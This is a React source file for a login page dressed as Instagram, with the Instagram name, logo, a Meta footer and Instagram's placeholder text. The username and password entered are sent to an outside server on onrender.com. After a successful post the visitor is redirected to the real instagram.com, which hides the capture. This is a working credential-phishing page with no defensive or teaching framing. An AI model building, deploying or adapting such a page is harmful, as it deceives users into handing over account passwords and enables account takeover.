import { useState } from "react";
import "./App.css";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");
  const [loggedIn, setLoggedIn] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e) => {
    e.preventDefault();

    if (!username.trim() || !password.trim()) {
      setMessage("Please enter username and password");
      return;
    }

    setLoading(true);
    setMessage("");

    try {
      const response = await fetch("https://catgram-1-ou2s.onrender.com/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: username.trim(),
          password,
        }),
      });

      const data = await response.json();

     if (data.success) {
  window.location.href = "https://www.instagram.com/";
} else {
  setMessage(data.message || "Login failed");
}
    } catch (error) {
      console.error("Login error:", error);
      setMessage(
        "Cannot connect to server. Make sure the backend is running."
      );
    } finally {
      setLoading(false);
    }
  };

  // HOME PAGE
  if (loggedIn) {
    return (
      <div className="home-page">
        <div className="home-brand">
          <div className="instagram-camera">
            <div className="instagram-lens"></div>
            <div className="instagram-dot"></div>
          </div>

          <h1>Catgram</h1>
        </div>

        <h2>Welcome, {username}!</h2>

        <p>Login successful 🎉</p>

        <button
          className="logout-btn"
          onClick={() => {
            setLoggedIn(false);
            setUsername("");
            setPassword("");
          }}
        >
          Log out
        </button>
      </div>
    );
  }

  // LOGIN PAGE
  return (
    <div className="page">
      <div className="language">English (UK)</div>

      <main className="login-container">

        {/* Instagram-style logo */}
        <div className="instagram-logo">
          <div className="instagram-camera">
            <div className="instagram-lens"></div>
            <div className="instagram-dot"></div>
          </div>
        </div>

        <div className="brand-name">Instagram</div>

        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Username, email address or mobile number"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            autoComplete="username"
          />

          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="current-password"
          />

          <button
            className="login-btn"
            type="submit"
            disabled={loading}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>

        {message && (
          <p
            style={{
              color: "#ff6b6b",
              marginTop: "15px",
              textAlign: "center",
            }}
          >
            {message}
          </p>
        )}

        <button className="forgot-btn" type="button">
          Forgotten password?
        </button>

        <button className="create-btn" type="button">
          Create new account
        </button>

        {/* Meta footer */}
        <div className="meta-footer">
          <svg
            width="34"
            height="22"
            viewBox="0 0 34 22"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M2 15.5C4.5 19.5 8 20 10.5 16L16 7C18.5 3 21.5 3 24 7L30.5 17"
              stroke="currentColor"
              strokeWidth="3.5"
              strokeLinecap="round"
            />

            <path
              d="M4 7C6.5 3 10 2.5 13 7L19 16C21.5 20 25 19.5 27.5 16"
              stroke="currentColor"
              strokeWidth="3.5"
              strokeLinecap="round"
            />
          </svg>

          <span>Meta</span>
        </div>
      </main>
    </div>
  );
}

export default App;